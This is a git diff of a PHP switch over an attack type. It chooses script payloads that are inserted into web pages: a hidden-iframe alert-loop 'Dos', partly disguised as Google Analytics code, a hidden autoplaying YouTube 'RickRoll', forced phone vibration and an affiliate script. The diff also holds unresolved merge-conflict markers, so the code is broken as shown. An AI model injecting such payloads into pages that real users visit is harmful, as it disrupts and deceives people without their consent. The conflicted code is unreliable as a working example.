@@ -23,6 +23,7 @@ switch($typeOfAttack){
           runScript($textToInsert);
           break;
     case "Dos":
+<<<<<<< HEAD
 $textToInsert="<!-- Google Analytics -->
 <script>
 window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
@@ -33,6 +34,12 @@ ga('send', 'pageview');
 <!-- End Google Analytics --><iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
           //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
           runScript($textToInsert);
+=======
+          $textToInsert="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
+          //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
+          runScript($textToInsert);
+
+>>>>>>> parent of 45000dc... added affilate and working on final year project
           break;
         
     case "RickRoll":
@@ -52,11 +59,12 @@ ga('send', 'pageview');
         
     case "Vibration":
           $textToInsert =  "<script type='text/javascript'>
-            navigator.vibrate = navigator.vibrate ||
-            navigator.webkitVibrate ||
-            navigator.mozVibrate ||
-            navigator.msVibrate;
+  navigator.vibrate = navigator.vibrate ||
+       navigator.webkitVibrate ||
+       navigator.mozVibrate ||
+       navigator.msVibrate;
 
+<<<<<<< HEAD
             navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500,                1000, 500]);
             </script>";
             runScript($textToInsert);
@@ -65,9 +73,15 @@ ga('send', 'pageview');
     case "Affliate":
         runAffliateScript();
         break;
+=======
+  navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500]);
+ </script>";
+ runScript($textToInsert);
+ break;
+>>>>>>> parent of 45000dc... added affilate and working on final year project
 
     default:
-          $textToInsert="<iframe width='0' height='0'                         src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
+          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
           runScript($textToInsert);
           break;
 }
